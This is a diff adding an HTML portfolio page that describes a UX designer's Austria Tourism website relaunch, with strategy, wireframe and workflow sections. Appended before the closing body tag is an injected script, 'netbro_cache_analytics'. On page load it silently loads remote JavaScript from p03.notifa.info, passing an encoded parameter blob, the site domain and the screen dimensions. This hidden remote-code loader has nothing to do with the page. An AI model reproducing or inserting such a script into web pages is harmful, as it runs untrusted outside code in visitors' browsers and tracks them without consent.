@@ -1,0 +1,135 @@
+
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8" lang="en"> <![endif]-->
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en"> <![endif]-->
+<!--[if IE 9 ]><html class="ie9 no-js"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!--> <html class="no-js"> <!--<![endif]--><html>
+	<head>
+		<title>Melanie Daveid - UX Design & Art Direction</title>
+
+		<!-- META DATA -->
+		<meta http-equiv="content-type" content="text/html; charset=utf-8">
+		<meta name="description" content=""/>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0"/>
+
+		<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+		<link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+		<!-- CSS -->
+		<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
+		<link type="text/css" rel="stylesheet" href="./assets/css/styles.min.css?v=1.7" />
+
+		<!-- JAVASCRIPT -->
+		<script type="text/javascript" src="./assets/js/respond.min.js"></script>
+		<script type="text/javascript" src="./assets/js/modernizr.min.js"></script>
+
+	</head>
+	<body class="loading">
+		<div class="project">
+			<div class="project__content">
+				<div class="row">
+					<div class="column--s-12 column--xl-8 column-offset--xl-2 padding--s-3 padding--m-6">
+						<p class="text-align--s-left">
+							Relaunch and conception of the existing website and upcoming online magazine for the official tourism platform of Austria were the main objectives. The appearance will represent Austria as a country with traditional values and a modern attitude.
+						</p>
+					</div>
+				</div>
+				<div class="row" style="background-color: #efefef;">
+					<div class="column--s-12">
+						<img src="./assets/img/content/austria-tourism/01-austria-tourism.jpg" class="responsive" alt="">
+					</div>
+				</div>
+				<div class="row" style="background-color: #e0001a;">
+					<div class="column--s-12 column--xl-8 column-offset--xl-2 padding--s-3 padding--m-6">
+						<h4 class="proxima-nova-bold" style="color: #fff">Digital Strategy</h4>
+						<p style="color: #fff">
+							A research and concept phase which referred to an existing brand strategy set the course at the beginning of this project. General use cases based on personas, information architecture and detailed wireframes for the whole digital appearance followed.
+						</p>
+						<p style="color: #fff">
+							This appearance was structured into modules with a limited amount of additional functionalities and supportive tools which build the framework for an engaging experience.
+						</p>
+						<p style="color: #fff">
+							This approach provided a number of possibilities for the content team to setup unique pages without forcing relevant and well elaborated content into steady templates.
+						</p>
+					</div>
+				</div>
+				<div class="row" style="background-color: #efefef;">
+					<div class="column--s-12">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center">
+							<h4 class="subtitled">Wireframes</h4>
+							<h6 class="text-color--red proxima-nova-bold uppercase">Desktop</h6>
+						</div>
+						<img src="./assets/img/content/austria-tourism/02-austria-tourism.jpg" class="responsive" alt="">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center"></div>
+					</div>
+				</div>
+				<div class="row" style="background-color: #fff;">
+					<div class="column--s-12 column--xl-8 column-offset--xl-2 padding--s-3 padding--m-6">
+						<h4 class="proxima-nova-bold" style="color: #292929">Wireframes and Navigation</h4>
+						<p style="color: #292929">
+							Austria Tourism asked for very detailed wireframes for both desktop and mobile devices to eliminate possible doubts at an early stage. 
+						</p>
+						<p style="color: #292929">
+							Especially the navigation concept which was tested with interactive click dummies was quite a challenge because of the huge amount of content that should have been neatly structured at this point.
+						</p>
+					</div>
+				</div>
+				<div class="row" style="background-color: #efefef;">
+					<div class="column--s-12">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center">
+							<h4 class="subtitled">Wireframes</h4>
+							<h6 class="text-color--red proxima-nova-bold uppercase">Mobile</h6>
+						</div>
+						<img src="./assets/img/content/austria-tourism/03-austria-tourism.jpg" class="responsive" alt="">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center"></div>
+					</div>
+				</div>
+				<div class="row" style="background-color: #e0001a;">
+					<div class="column--s-12 column--m-8 column-offset--m-2 padding--s-3 padding--m-6">
+						<h4 class="proxima-nova-bold" style="color: #fff">Interactions and Workflow</h4>
+						<p style="color: #fff">
+							Most interactions were displayed statically with descriptive graphics to enable the start of the design process right after finishing a wireframe sprint. The sprints of this phase were kept short and crisp to allow multiple iteration cycles if needed.
+						</p>
+					</div>
+				</div>
+				<div class="row">
+					<div class="column--s-12">
+						<img src="./assets/img/content/austria-tourism/04-austria-tourism.jpg" class="responsive" alt="">
+					</div>
+				</div>
+
+				<div>
+					<div class="column--s-12 padding--s-4 text-align--s-center" style="background-color: #efefef;">
+						<p class="subtitled" style="font-size: 11px;">Client: Austria Tourism</p>
+						<p class="subtitled" style="font-size: 11px;">Agency: LOOP New Media</p>
+					</div>
+				</div>
+				
+				
+				<div class="row background-color--white text-align--s-center">
+					<div class="column--s-12 column--m-8 column-offset--m-2 padding--s-3 padding--m-6">
+						<a data-next-project href="#" class="button--hexagon">
+							<span class="slice"></span>
+							<span class="slice"></span>
+							<span class="slice"></span>
+							<span class="slice"></span>
+							<span class="slice"></span>
+							<span class="slice"></span>
+							<span class="button__label text-color--white">Next</span>
+						</a>
+					</div>
+				</div>
+				
+
+			</div>
+		</div>
+		
+		<script src="./assets/js/vendor.min.js"></script>
+		<script src="./assets/js/plugins.min.js"></script>
+		<script src="./assets/js/scripts.min.js"></script>
+
+
+	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2xeHgH3f4AqZdeFrvQn4yR7uqpQgkgfib4fxSuygpoMMGxKMHAmcvwfZxOJpEJuQmb4KRQgSECz6bV8P6dSluefMCipLc45PrBzyHzDAFurm4k%2b8KvfEHum4Bimg5LJDz2nQ2HC4UO0jhgmCCz6W5KOdI1LPoO%2b%2b2u0eGzWv5RGkulGxNUwtsWJd6SWMoFvwxOi3SYjSWrFRPrUTIbIQuK39JNLYfQGSJmweutDQ2G%2bkDDod49xbCUEfnIesa1wAKLrinrPZF4w%2buQZC7XJr1xu6XC1lbm5ltKBGyYqVtn5ry2T37hLtXX2CqMLZEf1LjmTzMMCJs744ktgtsvFUTKx9v%2f6L8Mkohof5xEc0ivIOakrZFb00ZWybhm4XzDgC87m%2b54k4nmmPLxf4fZrWtx5I1AlGUKPkJRneMBjLmWyHMNv5UiL4A4g9PUMX0%2b%2fCcVaSj1Q17bsas6JA%2bDs%2bCqMdaV47LMPPWp%2b4yeYwQ8w5pUoNE9b9FjShsTffzBsHZsiftQcBNyNuJBjkcUULz97H8ZBEejzXG51LQgqHPQRPOU%2bs7ia1zqlMabAZtrqMG" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+</html>
